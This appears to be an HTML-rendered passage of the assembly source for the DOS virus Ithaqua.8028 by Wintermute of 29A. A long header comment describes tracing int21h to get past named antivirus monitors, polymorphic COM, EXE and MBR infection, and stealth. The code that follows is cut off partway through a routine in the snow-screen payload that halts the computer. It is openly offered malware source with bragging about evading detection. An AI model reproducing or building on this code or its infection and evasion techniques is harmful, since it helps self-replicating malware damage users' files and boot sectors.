<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Multi.Ithaqua.8028 - ithaqua.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;                            .   .       .  .    .</span><span class="sc0">
</span><span class="sc1">;                           .:: .:.. .. .:.::. :.:.</span><span class="sc0">
</span><span class="sc1">;                       &lt;&lt;-=ÜÛÛÛÛÛÜ.ÜÛÛÛÛÛÜ.ÜÛÛÛÛÛÜ==&lt;</span><span class="sc0">
</span><span class="sc1">;                         .:ÛÛÛ ÛÛÛ:ÛÛÛ ÛÛÛ.ÛÛÛ ÛÛÛ::.</span><span class="sc0">
</span><span class="sc1">;                        :: .ÜÜÜÛÛß.ßÛÛÛÛÛÛ:ÛÛÛÛÛÛÛ .:.</span><span class="sc0">
</span><span class="sc1">;                       .:..ÛÛÛÜÜÜÜ.ÜÜÜÜÛÛÛ.ÛÛÛ ÛÛÛ.::.:</span><span class="sc0">
</span><span class="sc1">;                     .:&gt;===ÛÛÛÛÛÛÛ:ÛÛÛÛÛÛß.ÛÛÛ ÛÛÛ==-&gt;&gt; .</span><span class="sc0">
</span><span class="sc1">;                   ..: ::. . .:..Laboratories .:.. :.. ::..</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      Replicant name.............Ithaqua</span><span class="sc0">
</span><span class="sc1">;      Brain engineer.............Wintermute/29A</span><span class="sc0">
</span><span class="sc1">;      Model......................Advanced Nexus-6 Final Beta</span><span class="sc0">
</span><span class="sc1">;      Corporal type..............Unknown</span><span class="sc0">
</span><span class="sc1">;      Size.......................8543 celular units</span><span class="sc0">
</span><span class="sc1">;      Date of Birth..............28/9/1998</span><span class="sc0">
</span><span class="sc1">;      Date of Termination........Reserved</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                    Ithaqua replicant significative data</span><span class="sc0">
</span><span class="sc1">;                     ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Intruding technologies</span><span class="sc0">
</span><span class="sc1">;    ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   For entering into enemy or hostile systems, Ithaqua  has  an  unique</span><span class="sc0">
</span><span class="sc1">; feature; code emulating. This allows the owner to make a great variety</span><span class="sc0">
</span><span class="sc1">; of things, such as tracing the int21h to it's original  handler.  Many</span><span class="sc0">
</span><span class="sc1">; tests have been made with this,  evading  biocode  killers  and  other</span><span class="sc0">
</span><span class="sc1">; hostile  or  neutral  programs;  Virstop  ( F-prot ),  Vsafe,  Vshield</span><span class="sc0">
</span><span class="sc1">; ( McAfee ), TbDriver ( Tbav ),  Sentinel  ( Panda )...  Smartdrv,  and</span><span class="sc0">
</span><span class="sc1">; nearly any program that dares to handle int21h.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   The code emulator is an advanced engine  about  2'7  Kb  long  which</span><span class="sc0">
</span><span class="sc1">; dissasembles and executes under control each instruction it  finds  on</span><span class="sc0">
</span><span class="sc1">; it's way to  int21h,  but  evading  at  the  same  time  antidebugging</span><span class="sc0">
</span><span class="sc1">; techniques and tricks. Some of the instructions are just  executed  at</span><span class="sc0">
</span><span class="sc1">; the "execution zone" in  the  code  with  special  security  measures,</span><span class="sc0">
</span><span class="sc1">; others are even more controlled by just emulating their efects (  this</span><span class="sc0">
</span><span class="sc1">; is so explained in the Arise Code Emulator article in this magazine )</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   When entering a system, first  of  all  the  engine  will  find  the</span><span class="sc0">
</span><span class="sc1">; original handler of int21h, aborting operation  if  not  found.  After</span><span class="sc0">
</span><span class="sc1">; that, it will handle with a far jmp  ( EAh XX XX XX XX )  one  of  the</span><span class="sc0">
</span><span class="sc1">; three first instructions on the int21h handler. This jump, of  course,</span><span class="sc0">
</span><span class="sc1">; is controlled by the replicant itself in order to let  other  programs</span><span class="sc0">
</span><span class="sc1">; access to int21h when needed and mantain it's own supremacy;  when  an</span><span class="sc0">
</span><span class="sc1">; int21h is called, the jump goes to the virus  code.  After  int21h  is</span><span class="sc0">
</span><span class="sc1">; restored and checks are  made,  it  traces  five  instructions  before</span><span class="sc0">
</span><span class="sc1">; recovering the jump, then replaces it.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Also, this jump is often changed  to  make  difficult  removing  the</span><span class="sc0">
</span><span class="sc1">; virus from memory. Each time int8h ( timer interrupt, non anulated  by</span><span class="sc0">
</span><span class="sc1">; a cli ) is made, it changes the jump among that 3 positions. Fixes are</span><span class="sc0">
</span><span class="sc1">; made for handling when special/weird conditions occur ( such as Dos in</span><span class="sc0">
</span><span class="sc1">; UMBs )</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Autoreplicating technologies</span><span class="sc0">
</span><span class="sc1">;    ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Ithaqua infects COM Appending/Inserting,  EXE cavity/appending,  and</span><span class="sc0">
</span><span class="sc1">; MBR on hard disks.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   For COM infection, if there's EMS available and the file is  smaller</span><span class="sc0">
</span><span class="sc1">; than 32Kb, Ithaqua will load it and search a random 3-byte instruction</span><span class="sc0">
</span><span class="sc1">; among the first 255 ones to place the jump to it's code by using  it's</span><span class="sc0">
</span><span class="sc1">; code emulator, making the inserting infection same  as  stable  as  an</span><span class="sc0">
</span><span class="sc1">; appending one could be. Otherwise ( if there's no EMS or the  file  is</span><span class="sc0">
</span><span class="sc1">; bigger than 32kb ) it will infect by the old appending technique.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   The EXE cavity infection isn't anything of special  interest  except</span><span class="sc0">
</span><span class="sc1">; it's cavity ;P. It will search for the same opcode ( no  matter  which</span><span class="sc0">
</span><span class="sc1">; one ) in the EXE file and if it's successful it will copy itself there</span><span class="sc0">
</span><span class="sc1">; and change the CS:IP in header. Just bored of making always  the  same</span><span class="sc0">
</span><span class="sc1">; infection method, not anything to really worth about.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   File infection in EXE cavity and COM appending is polymorphic due to</span><span class="sc0">
</span><span class="sc1">; "RNME" ( Reconstructed Necromantic Mutation Engine ).  In the  basics,</span><span class="sc0">
</span><span class="sc1">; this is the engine I used in Zohra virus; maybe using tables as in the</span><span class="sc0">
</span><span class="sc1">; GROG engine ( the MBR poly in this virus ) I would save space, but who</span><span class="sc0">
</span><span class="sc1">; cares, then it won't be the RNME :-P. I reduced the decrypting  groups</span><span class="sc0">
</span><span class="sc1">; instructions and added some options, instructions and other  stuff  to</span><span class="sc0">
</span><span class="sc1">; make it even more polymorphic, as well as subroutine calls... (  well,</span><span class="sc0">
</span><span class="sc1">; AVP detected only 4% of the samples when the weekly update  for  Zohra</span><span class="sc0">
</span><span class="sc1">; was out, so there's something that worked  good  on  this  engine  and</span><span class="sc0">
</span><span class="sc1">; better if so strenghten up &lt;g&gt; ).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   EXE appending infection is only made in two cases, where none of the</span><span class="sc0">
</span><span class="sc1">; others are performed. That is, when Windows95 is running,  or  in  the</span><span class="sc0">
</span><span class="sc1">; rare case that the code emulator failed. To prevent crashing  it  also</span><span class="sc0">
</span><span class="sc1">; uses an alternative int21h handler; it uses some of the routines  from</span><span class="sc0">
</span><span class="sc1">; the other infection code, but it's not compatible with them,  as  they</span><span class="sc0">
</span><span class="sc1">; use SFTs, etc, which don't exist in Win95. It's just that it's  better</span><span class="sc0">
</span><span class="sc1">; non-condemning Ithaqua to death when on Win95 as this operating system</span><span class="sc0">
</span><span class="sc1">; is probably the most... hum... "widespread" now.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   MBR is done esentially to prevent user from booting out of the  hard</span><span class="sc0">
</span><span class="sc1">; disk with one of those clean diskettes; so this infection doesn't load</span><span class="sc0">
</span><span class="sc1">; the whole virus. It just waits for the real virus,  which  then  takes</span><span class="sc0">
</span><span class="sc1">; control of the int13h and kills the MBR module.  I  feel  more  secure</span><span class="sc0">
</span><span class="sc1">; getting int21h with my code emulator than with any other method :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   The MBR infection is polymorphic, due to my  "Gory  Ruthless  Opcode</span><span class="sc0">
</span><span class="sc1">; Generator", which is a new about 600  bytes  long  boot-oriented  poly</span><span class="sc0">
</span><span class="sc1">; engine, creating two encryption layers. The original MBR is  encrypted</span><span class="sc0">
</span><span class="sc1">; and stored in sector two; maybe the most interesting thing about  this</span><span class="sc0">
</span><span class="sc1">; poly  engine  is  that  it's  so  compact,  as  new  instructions   or</span><span class="sc0">
</span><span class="sc1">; instruction groups can be easily  added  to  make  a  new  polymorphic</span><span class="sc0">
</span><span class="sc1">; engine; also has some stack tricks that can only be  done  in  a  boot</span><span class="sc0">
</span><span class="sc1">; oriented engine.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   The MBR infection check method is so simple; I was going to do  some</span><span class="sc0">
</span><span class="sc1">; CRC on it and save the byte in the end  before  the  55AAh,  but  it's</span><span class="sc0">
</span><span class="sc1">; easier just to call int13h; if the resident MBR stuff is there it will</span><span class="sc0">
</span><span class="sc1">; answer us, if not, it's not there :). When it's off, the virus will be</span><span class="sc0">
</span><span class="sc1">; in memory; if you disinstall it it will fuck up the MBR when trying to</span><span class="sc0">
</span><span class="sc1">; infect, but hey, it was your phucking fault :P</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Self-concealing technology</span><span class="sc0">
</span><span class="sc1">;    ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Ithaqua has the typical FCB/DTA stealth, plus  Windows  95  stealth,</span><span class="sc0">
</span><span class="sc1">; which is performed on 714eh and 714fh functions from int21h ( that is,</span><span class="sc0">
</span><span class="sc1">; for example, which Dos 7.0 use ).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   The two polymorphic engines and encryption were described above.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Payload</span><span class="sc0">
</span><span class="sc1">;    ÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   This time the payload is a video effect which is a  snow  effect  on</span><span class="sc0">
</span><span class="sc1">; some text about the virus name; it is activated  each  29th  of  April</span><span class="sc0">
</span><span class="sc1">; when the user executes the virus, and "halts the computer" :-P</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Final comments</span><span class="sc0">
</span><span class="sc1">;    ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Yep, guys. This has reached  the  end.  I've  been  a  lot  of  time</span><span class="sc0">
</span><span class="sc1">; thinking about this painful decission, but I have no  chance  at  all.</span><span class="sc0">
</span><span class="sc1">; University is consuming all my spare time, and,  let's  face  it,  I'm</span><span class="sc0">
</span><span class="sc1">; getting a bit tired on this, as I'm all day working and I  just  can't</span><span class="sc0">
</span><span class="sc1">; continue as I was; this virus was a lot of months I'm afraid to count,</span><span class="sc0">
</span><span class="sc1">; and it shouldn't have wasted that amount of time on this one.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   So, I'm leaving 29A, and I don't know if I'll leave virus writing; I</span><span class="sc0">
</span><span class="sc1">; can't continue writing more and more viruses and articles.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Anyway, I'll be around :), and by  this  moment  I'll  remain  as  a</span><span class="sc0">
</span><span class="sc1">; collaborator for 29A so if I have the  time  for  writing  stuff  I'll</span><span class="sc0">
</span><span class="sc1">; publish it here :).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   And coming to the end,... 29A isn't only a bunch of people that send</span><span class="sc0">
</span><span class="sc1">; their viruses among them and publish 'em later; I've made friends  and</span><span class="sc0">
</span><span class="sc1">; known many people by this group, and by all my time as a virus writer.</span><span class="sc0">
</span><span class="sc1">; So, I dedicate this little child to all of them: to the 29A  Crew,  to</span><span class="sc0">
</span><span class="sc1">; all people that helped me to grow, and to the people I've  known  this</span><span class="sc0">
</span><span class="sc1">; fantastic years on virus writing. A great hug to all of ya, and see ya</span><span class="sc0">
</span><span class="sc1">; on IRC... :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Assembly notes</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Tasm ithaqua.asm /m2</span><span class="sc0">
</span><span class="sc1">;   Tlink ithaqua.obj</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;       Las grandes tristezas son as¡; se clavan tan hondo en el coraz¢n</span><span class="sc0">
</span><span class="sc1">;            que parecen perdidas y el mismo coraz¢n no las siente,</span><span class="sc0">
</span><span class="sc1">;                             con asombro nuestro.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Pero dura poco el enga¤o; est n bien clavadas para toda la vida.</span><span class="sc0">
</span><span class="sc1">;      Primero es llanto, quejas, rabia quiz ; despu‚s, es la resignaci¢n,</span><span class="sc0">
</span><span class="sc1">;                  una sonrisa, una sonrisa triste y dolorosa,</span><span class="sc0">
</span><span class="sc1">;                        como una herida abierta siempre.</span><span class="sc0">
</span><span class="sc1">;                           ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;                             ( Jacinto Benavente )</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">


</span><span class="sc5">virus_starts</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">Virus</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; insertion</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">                                </span><span class="sc1">; delta</span><span class="sc0">
</span><span class="sc5">BP_Init</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">we_r_there</span><span class="sc4">))</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">temp</span><span class="sc0">                </span><span class="sc1">; Future crypt</span><span class="sc0">
</span><span class="sc5">Fut_Crypt</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">encryption_starts</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">encryption_length</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">encryption_ends</span><span class="sc4">-</span><span class="sc5">encryption_starts</span><span class="sc0">

</span><span class="sc5">payload</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;        0                                             320</span><span class="sc0">
</span><span class="sc1">;        ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;        ³                                               ³</span><span class="sc0">
</span><span class="sc1">;        ³                                               ³</span><span class="sc0">
</span><span class="sc1">;        ³                                               ³</span><span class="sc0">
</span><span class="sc1">;        ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;        0+320*199                             320+320*199</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">random</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0013h</span><span class="sc0">        </span><span class="sc1">; Mode 13h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0a000h</span><span class="sc0">          </span><span class="sc1">; Begins in 0a000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; Blank screen ( all = 0 )</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">64000d</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc2">320d</span><span class="sc4">*</span><span class="sc2">198d</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; Final line</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">640d</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">042d</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0f03h</span><span class="sc0">        </span><span class="sc1">; Write text</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">5d</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">VName</span><span class="sc0">
</span><span class="sc5">@write</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@dabaduba</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@write</span><span class="sc0">
</span><span class="sc5">@dabaduba</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc5">@dabadaba</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Create_Row</span><span class="sc0">      </span><span class="sc1">; A new snowy row</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Move_Row</span><span class="sc0">        </span><span class="sc1">; Moves a row one pixel below, checks all</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Retrace</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@dabadaba</span><span class="sc0">


</span><span class="sc5">Create_Row</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8d</span><span class="sc0">
</span><span class="sc5">Randomize</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Get_Random_NB</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">320d</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; Rest = AH</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">15d</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Randomize</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Get_Random_NB</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">random</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get Random</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0dcbah</span><span class="sc0">
</span><span class="sc5">Change_R</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Change_R</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Change_R</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Change_R</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">random</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">random</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Change_R</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
